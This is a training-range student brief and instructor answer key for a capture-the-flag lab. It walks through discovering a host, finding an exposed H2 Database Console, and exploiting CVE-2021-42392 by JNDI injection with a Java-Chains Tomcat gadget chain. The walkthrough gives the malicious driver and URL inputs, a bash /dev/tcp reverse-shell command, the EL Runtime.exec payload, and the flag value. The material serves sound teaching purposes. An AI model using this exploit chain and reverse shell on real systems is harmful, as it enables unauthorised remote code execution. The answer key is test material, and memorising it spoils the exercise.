# Dallas Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.14.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Dallas.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Dallas — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.14.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Dallas|
|Assigned subnet|`192.168.14.0/24`|
|Deploy flag key|`T5_FLAG`|
|Default flag|`scarlet-mantis`|
|Flag location on target|`/flag.txt` after access|

Rotate `T5_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.14.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.14.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Dallas Module (`B02.M14`). Students know only the assigned subnet `192.168.14.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.14.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T5_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `gobuster` (directory enumeration against the Spring Boot web root)
- `curl` (HTTP headers, form inspection, optional login POST)
- a web browser (H2 Console login — the usual way to submit Driver Class / JDBC URL)
- `python3` (pretty-print the Spring Boot JSON 404)
- Docker (recommended) **or** `java` **JDK 8** for [Java-Chains](https://github.com/vulhub/java-chains) — the JNDI payload generator used by the Vulhub PoC ([quick-start guide](https://java-chains.vulhub.org/docs/guide))
- `nc` (Netcat, for catching the reverse shell)
- `metasploit-framework` (section 4 — stock `h2_webinterface_rce` is the wrong CVE class; it does not shell this host)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.14.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.14.10
```

_Output:_

```
192.168.14.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.14.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.14.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.14.10
Host is up.
Nmap scan report for 192.168.14.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.14.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.14.10**.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.14.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.14.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. An open `8080/tcp` labeled only `http` is not enough; we need the product string (here, **Apache Tomcat**). JDWP on **5005** also prints a JVM version.
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. **5005** (JDWP) is easy to miss on a top-ports-only scan; **8080** is more likely to appear either way.

_Output excerpt:_

```
PORT     STATE SERVICE VERSION
5005/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_302
8080/tcp open  http    Apache Tomcat (language: en)
```

**Observation:** Port 8080 is HTTP identified as Apache Tomcat. Port 5005 is JDWP and fingerprints the JVM as **Java 8u302**.

**Inference:** JDWP is a debugger listener, not the web app. Confirm what the HTTP service actually is. Use **`:8080`** in URLs because that is the web listener nmap found (not 80).

#### Initial Web Probing

nmap told us HTTP on **8080**. Confirm that with a normal GET — headers and body. This is ordinary recon `curl`, not an exploit. You can also open `[http://192.168.14.10:8080/](http://192.168.14.10:8080/)` in a browser; the JSON error is the same.

```
curl -s -D - http://192.168.14.10:8080/ -o /tmp/t5-root.json | head -12
python3 -m json.tool < /tmp/t5-root.json
```

_Why this `curl`:_

- `-s` — silent; drop the progress meter.
- `-D -` — write response **headers** to stdout (`Content-Type`, status).
- `-o /tmp/t5-root.json` — write the **body** to a file so headers and JSON stay separated.
- `| head -12` — only the first header lines.
- `python3 -m json.tool` — indent the saved body so the error fields are readable.

_Header / body excerpt:_

```
HTTP/1.1 404
Content-Type: application/json
```

```
{
    "timestamp": "2026-10-08T18:04:14.961+00:00",
    "status": 404,
    "error": "Not Found",
    "path": "/"
}
```

`timestamp` changes on every request. The field names, `status`, `error`, and `path` are the stable part.

**Observation:** The JSON body uses the familiar `timestamp` / `status` / `error` / `path` shape.

**Inference:** That matches Spring Boot’s default error attributes ([Spring Boot API: `DefaultErrorAttributes`](https://docs.spring.io/spring-boot/api/java/org/springframework/boot/webmvc/error/DefaultErrorAttributes.html)). Combined with nmap’s Tomcat + Java 8 fingerprint, port 8080 is likely a Spring Boot application embedded in Tomcat — not Tomcat’s default welcome page. We still do not know which optional dev or management surfaces are exposed.

**Next probe:** Brute-force common web paths with **gobuster** before assuming a specific subsystem. Spring Boot returns JSON `404` for unmapped routes, so treat `404` as a miss (gobuster’s default) and look for other status codes such as `200`, `302`, or `500`:

```
gobuster dir -u http://192.168.14.10:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 40 --no-error
```

_What gobuster is doing:_ `gobuster dir` requests `GET /{word}` for each wordlist line. `-u` is the base URL nmap found. `-w` is Kali’s SecLists `Discovery/Web-Content/common.txt` (includes Spring- and admin-related paths such as `h2-console`). `-t 40` is thread count. `--no-error` hides transient connection noise.

_Output excerpt:_

```
error                (Status: 500) [Size: 73]
h2-console           (Status: 302) [Size: 0] [--> http://192.168.14.10:8080/h2-console/]
```

**Observation:** Gobuster reports **`/h2-console`** with **HTTP 302** redirecting to `/h2-console/`, plus an `/error` handler returning **500**. That is the first concrete database-related path on this host.

The smaller `/usr/share/wordlists/dirb/common.txt` list does **not** include `h2-console` and, on this target, only surfaces `/error`. Prefer SecLists `common.txt` (or a Spring-focused list) when enumerating Spring Boot apps.

**Candidate selection:** _Search:_ `spring boot h2 web console /h2-console` → Spring Boot docs describe an optional H2 console at that path when `spring.h2.console.enabled=true` ([Using H2’s Web Console](https://docs.spring.io/spring-boot/reference/data/sql.html#data.sql.h2-web-console)). Follow the redirect and confirm the console serves HTML:

```
curl -s -I http://192.168.14.10:8080/h2-console/
```

_Why `-I`:_ `curl -I` sends **HEAD** and prints response headers only. We only need status and `Content-Type` to see that `/h2-console/` is a real HTML app, not another JSON 404.

_Output excerpt:_

```
HTTP/1.1 200
Content-Type: text/html
```

**Inference:** An H2 Database Web Console is exposed on this Spring Boot host. Inspect the login form next to see whether connection parameters are user-controlled before login succeeds.

The console is a normal HTML form. **Browse to** `[http://192.168.14.10:8080/h2-console/](http://192.168.14.10:8080/h2-console/)` and view the login page (JavaScript redirects to `login.jsp`). The `curl` below is the same inspection for a copy-paste walkthrough.

```
HTML=$(curl -s http://192.168.14.10:8080/h2-console/)
JSESSION=$(echo "$HTML" | grep -oE 'jsessionid=[a-f0-9]+' | head -1 | cut -d= -f2)
curl -s "http://192.168.14.10:8080/h2-console/login.jsp?jsessionid=$JSESSION" | grep -iE 'title|Driver Class|JDBC URL|name="driver"|name="url"|value='
```

_Why this extraction / grep:_

- The first `curl` saves the landing HTML. H2 ties the login POST to a **`jsessionid`** in that page.
- `grep -oE 'jsessionid=[a-f0-9]+'` — print only the session token (`-o`), extended regex for hex id.
- `head -1 | cut -d= -f2` — first match, take the value after `=`.
- Second `curl` fetches `login.jsp` with that session.
- `grep -iE 'title|Driver Class|JDBC URL|name="driver"|name="url"|value='` — page identity and the **writable** form fields. We are not hunting a random string; those inputs are how the console opens a database.

_Body excerpt:_

```
<title>H2 Console</title>
Driver Class:
<input type="text" name="driver" value="org.h2.Driver" ... />
JDBC URL:
<input type="text" name="url" value="jdbc:h2:~/test" ... />
User Name: sa
Password:
```

**Observation:** The target exposes the **H2 Database Web Console**, and the login form lets an unauthenticated user set both **Driver Class** and **JDBC URL** before any successful database login.

**Inference:** The connection attempt itself may instantiate arbitrary Java classes / resolve arbitrary URLs. That is the attack surface to research next.

### 3. Vulnerability Discovery

Writable driver/URL fields on an H2 console are a classic attack surface. Two historically common paths are:

1. Older H2 console abuse (`jdbc:h2:mem:...` / `INIT=RUNSCRIPT ...`) — documented around **CVE-2018-10054**-style techniques.
2. Pre-auth **JNDI injection** when the console will load `javax.naming.InitialContext` as the driver — **CVE-2021-42392** (H2 before **1.4.206**), as described in [JFrog’s write-up](https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/) and in `vulnhub/h2database/CVE-2021-42392/README.md`.

**What the bug is (CVE-2021-42392):** On Connect, H2 loads whatever class you put in **Driver Class** and uses **JDBC URL** as the argument. If the driver is `javax.naming.InitialContext`, H2 calls `lookup(url)`. An `ldap://...` URL then hits an attacker LDAP server. What that LDAP response can _do_ depends on the JDK: this host is **8u302**, so remote `.class` loading is the wrong bet; a **local gadget** (`ResourceRef` / Tomcat `BeanFactory`) is the right one. Section 5 walks that chain. First we need the H2 version and proof that the old INIT login is closed.

#### Failed Attempt: Treating This Like the Older H2 INIT / in-memory Login

In the **browser**, leave the default driver and try an in-memory URL (or POST the same fields to `login.do?jsessionid=...`):

```
Driver Class: org.h2.Driver
JDBC URL:     jdbc:h2:mem:test
User Name:    sa
Password:
```

Submit **Connect**.

_Result (excerpt):_

```
Database "mem:test" not found, either pre-create it or allow remote database creation
(not recommended in secure environments) [90149-204]
```

_What we learned:_

- Remote/in-memory database creation is blocked (H2’s post-1.4.197 `-ifExists` / remote-create protections).
- The trailing `[90149-204]` identifies **H2 build 204** → version **1.4.204**, which is **before 1.4.206**. That version window still matches the JNDI console bug (**CVE-2021-42392**), while the older INIT login path does not.

A JDBC URL with `INIT=RUNSCRIPT FROM 'http://...'` fails the same way: you never get a session in which to run scripts.

Keeping `org.h2.Driver` and only swapping the URL to `ldap://...` also fails: H2 still parses the string as an H2 database URL. **Both** form fields matter. The Vulhub PoC for this CVE sets Driver Class to `javax.naming.InitialContext`.

**Candidate selection:** Searching from H2 console + JNDI + version **1.4.204** — `H2 console JNDI InitialContext CVE-2021-42392` — confirms the pre-auth JNDI path. Craft a callback with a gadget that works on **Java 8u302** + Tomcat/Spring Boot (ResourceRef / BeanFactory), not a `trustURLCodebase` remote-classload payload.

Section 4 tries Metasploit (wrong CVE class on this host), then the working Java-Chains LDAP URL. Section 5 is why that URL executes on 8u302.

### 4. Automated Path: Metasploit (wrong class), then Java-Chains

`search h2` finds `exploit/linux/http/h2_webinterface_rce`. That module needs a **successful database login** so it can `CREATE ALIAS` (the CVE-2018-10054-style path). Against this target:

```
msfconsole -q
```

```
msf6 > use exploit/linux/http/h2_webinterface_rce
msf6 exploit(linux/http/h2_webinterface_rce) > set RHOSTS 192.168.14.10
msf6 exploit(linux/http/h2_webinterface_rce) > set RPORT 8080
msf6 exploit(linux/http/h2_webinterface_rce) > set TARGETURI /h2-console/
msf6 exploit(linux/http/h2_webinterface_rce) > set USERNAME sa
msf6 exploit(linux/http/h2_webinterface_rce) > set PASSWORD ""
msf6 exploit(linux/http/h2_webinterface_rce) > set DATABASE jdbc:h2:mem:
msf6 exploit(linux/http/h2_webinterface_rce) > check
[*] H2 web interface found, however database connection NOT successful
```

_Why these options:_ `RHOSTS` / `RPORT` / `TARGETURI` match the console gobuster found. `USERNAME sa` and empty password are the form defaults. `DATABASE jdbc:h2:mem:` is the in-memory URL the module expects for a creatable DB.

_What we learned:_ Metasploit correctly finds the console but cannot log in — the same remote-create block from section 3. Skip this module; it is the wrong CVE class for H2 **1.4.204** with creation disabled.

#### Java-Chains

The JavaChains container is already on this ops station: `docker ps` shows `java-chains` (`javachains/javachains:latest`), and `[http://127.0.0.1:8011](http://127.0.0.1:8011)` answers. The image tar is `/home/kali/Downloads/javachains-image.tar`. A failed login is not a missing install.

The desktop README password is the one the container was started with. Log in as `admin` with that password. If login says the username or password is wrong, the container was recreated with an empty `CHAINS_PASS` and generated a new password. Read that password from the startup log instead of loading the image again:

```
docker logs java-chains | egrep 'username|password'
```

Only if the container is actually absent:

```
ls -la /home/kali/Downloads/javachains-image.tar
sudo docker load -i /home/kali/Downloads/javachains-image.tar
docker run -d --name java-chains --restart=always --network host \
  -e CHAINS_AUTH=true -e CHAINS_PASS=<password from the desktop README> \
  javachains/javachains:latest
```

Leave `CHAINS_PASS` set. An empty value rotates the password on the next start, and the desktop README then stops matching.

Before generating JNDI URLs, open the Servers panel (or POST `/jndiControl`) and set the **public/client IP** to the `src` address from `ip route get 192.168.14.10` (this deployment: `172.16.123.100`). LDAP/RMI/HTTP URLs must be reachable from the target. `127.0.0.1` is not.

#### Working automated path: Java-Chains LDAP URL

The Vulhub PoC uses Java-Chains (`[http://127.0.0.1:8011](http://127.0.0.1:8011)`) to build the LDAP response. Start a Netcat listener on the ops station. The callback address is the `src` from `ip route get 192.168.14.10` (this deployment: `172.16.123.100`). Do not use `192.168.100.1`.

```
nc -lvnp 4444
```

In Java-Chains (UI at `:8011`):

1. Open **Servers** and set the **public/client IP** to your lab-facing attacker IP; start the JNDI listeners (LDAP default **50389**).
2. Choose the chain from facts already on the page. nmap reported **Java 8u302** and **Apache Tomcat**. The H2 error `[90149-204]` is **H2 1.4.204**. On 8u302, remote `.class` loading is closed (`trustURLCodebase`). The LDAP answer has to use classes already on Tomcat, not a downloaded class. Section 5 is the longer version of this choice. The chain is:

```
JNDIResourceRefPayload → TomcatElRef → ElConvert → BytecodeConvert → Exec
```

```
Studio Tab → set Mode to JNDI → CHAIN MAP Section → Select JNDIResourceRefPayload → Select TomcatElRef for GADGET1 → Select ElConvert for GADGET2 → Select BytecodeConvert for GADGET 3 → Select Exec for GADGET4 → click Exec to set command
```

3. Set `Exec` / `cmd` to:

```
bash -c 'bash -i >& /dev/tcp/172.16.123.100/4444 0>&1'
```

4. Generate via the **JNDI** generate endpoint and copy the **LDAP** URL (must contain your attacker IP):

```
ldap://172.16.123.100:50389/<generated-resource>
```

**Browse to** `[http://192.168.14.10:8080/h2-console/](http://192.168.14.10:8080/h2-console/)` and submit **Connect** with:

```
Driver Class: javax.naming.InitialContext
JDBC URL:     ldap://172.16.123.100:50389/<generated-resource>
User Name:    sa
Password:
```

You can POST the same fields to `login.do?jsessionid=...` with `curl`; the browser form is the normal path.

The connection attempt itself is the trigger. H2 asks `javax.naming.InitialContext` to resolve the LDAP URL; Java-Chains returns a malicious `ResourceRef`; Tomcat’s `BeanFactory` evaluates it and runs the configured command. The login page may still show a follow-on error such as `ClassCastException: javax.el.ELProcessor cannot be cast to javax.sql.DataSource` — that often appears **after** the command has already run.

Check your Netcat listener:

```
listening on [any] 4444 ...
connect to [172.16.123.100] from (UNKNOWN) [192.168.14.10] 55444
root@9d1bc12ff380:/#
```

The source port and the container id in the prompt change across runs. This run's hostname was `9d1bc12ff380`. The peer address is the city host. The H2 page can still show `ClassCastException: javax.el.ELProcessor cannot be cast to javax.sql.DataSource` after the shell is already open.

From that shell, this run captured `id` and the flag. The first listener closed before the rest of the survey returned, so those other commands stay a checklist with no invented output.

```
id
cat /flag.txt
```

_Output excerpt (this run):_

```
uid=0(root)
scarlet-mantis
```

Checklist (run these; this check did not capture their output):

```
date -u
hostname
whoami
ip a
ip r
pwd
echo "$SHELL"
ps aux
uname -a
cat /etc/os-release
who
w
ss -tulpen
ss -tunap
find / -iname *flag.txt 2>/dev/null
```

That is a complete automated path to the flag. Section 5 is the longer explanation of the chain chosen above.

### 5. Manual Path: why Java-Chains works on Java 8u302

By section 4 we already know the H2 Console will load `javax.naming.InitialContext` and treat the JDBC URL as a JNDI name. The remaining question is not “how do I click Connect,” but **what the attacker LDAP server should return** when the target looks that name up.

Java-Chains is a payload factory plus listener suite for that problem: the web UI on `:8011` builds the gadget; the LDAP listener on `:50389` answers the target’s lookup. The matching Vulhub environment is `vulnhub/h2database/CVE-2021-42392/README.md`.

#### Remote Class Loading vs a Local Gadget Chain

When H2 looks up `ldap://ATTACKER:50389/...`, the LDAP server can answer in more than one way. Two common answers matter here.

**Path A — Remote class loading:** the LDAP response tells the JVM to download a remote `.class` from `http://ATTACKER/...` and run it. That only works when the target still trusts remote codebases (`trustURLCodebase`). A JDK below **8u191** often still allowed that. This target’s **Java 8u302** largely closes that door: the lookup may reach your LDAP server, but the JVM will not download and execute attacker bytecode.

**Path B — Local gadget chain** (what this target needs): instead of shipping new code, the LDAP response returns a crafted Java object (here a Tomcat-style `ResourceRef`) that only references **classes already on the target’s classpath**.

In this context:

- A **gadget** is an existing class on the host that has a useful side effect when the JVM or a framework (Tomcat’s `BeanFactory`, EL processor, etc.) resolves it — for example, running a string as a command.
- A **gadget chain** is a short sequence of those classes wired together so the first object is something JNDI/Tomcat will accept, each hop transforms or interprets the next, and the last hop reaches OS command execution.
- **Local** means no new bytecode has to be downloaded. The attacker supplies only the _recipe_ (which existing classes to instantiate and how to point them at each other). The target already has the ingredients because it is running Tomcat / Spring Boot.

Enumeration already showed Tomcat on 8080, Java 8u302, and a Spring Boot app with an H2 console — so Tomcat’s BeanFactory / EL classes are on the classpath. That is why Path B is the right hypothesis for this host.

#### What the Java-Chains Modules Do

The Vulhub PoC builds this sequence:

```
JNDIResourceRefPayload → TomcatElRef → ElConvert → BytecodeConvert → Exec
```

|Link|Role on this target|
|---|---|
|**JNDIResourceRefPayload**|LDAP returns a `ResourceRef` (BeanFactory-style reference), **not** a remote codebase URL|
|**TomcatElRef**|Points that reference at Tomcat’s own factory / EL entry point already on the host|
|**ElConvert / BytecodeConvert**|Turns the reference into evaluation of attacker-controlled expression/bytecode using **local** libraries|
|**Exec**|Ends in OS command execution (the reverse-shell line you configured)|

You are not writing those classes by hand. Java-Chains builds the serialized reference; the target’s Tomcat stack does the dangerous work because those classes were already there for normal app-server behavior.

#### Example: Following One Reference Through the Stack

This is the classic Tomcat `BeanFactory` + `ELProcessor` shape that Java-Chains’ chain is building toward. Live Java-Chains EL may be denser or more obfuscated; the **layering** is what matters.

**Layer 0 — What you transmit (H2 form)**

Only two attacker-controlled strings leave the browser:

```
Driver Class:  javax.naming.InitialContext
JDBC URL:      ldap://172.16.123.100:50389/abc123
```

Nothing in that HTTP POST is a gadget yet — only “which class to load” and “what name to look up.”

**Layer 1 — How H2 interprets those strings**

H2’s connection helper roughly:

1. Loads class `javax.naming.InitialContext`
2. Because that class is a JNDI `Context`, calls `lookup("ldap://172.16.123.100:50389/abc123")`

The string that goes on the wire to the attacker is an LDAP search for name `abc123`. Still no command execution — only a directory lookup.

**Layer 2 — What LDAP returns (the gadget recipe)**

Instead of “download `Evil.class` from HTTP,” Java-Chains answers with a JNDI **`Reference`** — metadata naming classes **already on the target**. Conceptually:

```
Reference {
  className:  "javax.el.ELProcessor"
  factory:    "org.apache.naming.factory.BeanFactory"
  addrs: [
    { type: "forceString", content: "x=eval" },
    { type: "x",           content: "<EL expression that ends in Runtime.exec(...)>" }
  ]
}
```

|Field|Meaning|
|---|---|
|`factory = BeanFactory`|Ask **Tomcat’s** factory to build this object (local class)|
|`className = ELProcessor`|The object to build is an **EL evaluator** (also local)|
|`forceString = x=eval`|Treat property `x` as a call to method `eval`|
|`x = <EL expr>`|The argument to `eval` is this attacker string|

That `Reference` is the start of the local gadget chain: a recipe, not new bytecode.

**Layer 3 — How Tomcat’s `BeanFactory` interprets the Reference**

JNDI hands the `Reference` to `org.apache.naming.factory.BeanFactory`, which roughly:

1. Instantiates `javax.el.ELProcessor`
2. Sees `forceString: x=eval` → maps setting `x` to calling `eval(...)`
3. Calls `elProcessor.eval("<EL expression>")`

A local factory has turned directory metadata into a method call on a local class.

**Layer 4 — How the EL / Exec layer runs a command**

The EL string is where `ElConvert` → `BytecodeConvert` → `Exec` show up. A simplified teaching form of the end state:

```
"".getClass()
  .forName("java.lang.Runtime")
  .getMethod("getRuntime")
  .invoke(null)
  .exec(new String[]{"bash","-c","bash -i >& /dev/tcp/172.16.123.100/4444 0>&1"})
```

`ELProcessor.eval` runs attacker-controlled expression language; that expression reflects into `Runtime.exec`; the OS runs the reverse shell into Netcat.

**Layer 5 — Why H2 may still error afterward**

After the chain runs, H2 expects a `DataSource`. It got an `ELProcessor` (or similar) instead, so you often see `ClassCastException: ... cannot be cast to javax.sql.DataSource`. That is post-exploitation noise — check Netcat first.

```
[Browser]  driver=InitialContext  url=ldap://ATTACKER:50389/abc123
    │
    ▼
[H2]       InitialContext.lookup(url)          ← only your two strings
    │
    ▼
[LDAP]     returns Reference                   ← gadget RECIPE (local class names)
    │
    ▼
[Tomcat]   BeanFactory → ELProcessor.eval(...) ← local factory + local EL
    │
    ▼
[OS]       Runtime.exec → reverse shell
    │
    ▼
[H2]       ClassCastException (optional)       ← ignore if nc has a shell
```

#### Operator Setup That Must Be Correct

Java-Chains listens on several ports. For this lab the important ones are:

|Port|Role|
|---|---|
|**8011**|Web UI / payload generate|
|**50389**|LDAP (what H2 contacts)|
|**58080**|HTTP bytecode helper used by some chains|

Your **Netcat** listener is separate: that is where `Exec`’s reverse shell lands.

When Java-Chains generates an LDAP URL, it embeds an IP the **target** must dial back to:

```
ldap://<attacker-ip>:50389/<resource-id>
```

If that IP is `127.0.0.1` (auto-detect inside Docker) or some WAN address the lab cannot reach, the H2 lookup never hits your listener and Netcat stays quiet even though the form was submitted correctly. Set the **public/client IP** in Java-Chains’ Servers panel to your lab-facing attacker address — the address the target can route to — before generating the URL.

#### End-to-End Flow After You Click Connect

1. H2 Console loads `javax.naming.InitialContext` as the “driver” and looks up the JDBC URL as a JNDI name.
2. The target opens an LDAP connection to your Java-Chains listener on **50389**.
3. Java-Chains returns the crafted `ResourceRef` for that resource id (the local gadget chain above).
4. Tomcat’s `BeanFactory` / EL path evaluates it and runs `Exec`.
5. H2 may still throw a follow-on error such as `ClassCastException: javax.el.ELProcessor cannot be cast to javax.sql.DataSource` — it expected a `DataSource`. That often appears **after** the command has already run; check Netcat first.

Target 5 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.14.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the session does not connect, set the JavaChains public IP and the reverse-shell address to the `src` from `ip route get 192.168.14.10`, not `192.168.100.1` and not `127.0.0.1`.
- If JavaChains login fails, the container is still installed. Read the current password with `docker logs java-chains`. Do not reload the image tar unless `docker ps` shows no `java-chains` container.
- If the recovered string does not match this table, read the live `T5_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.14.0/24`. The ops-station address can change with DHCP; take the callback address from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.14.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T5_FLAG` (default `scarlet-mantis`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.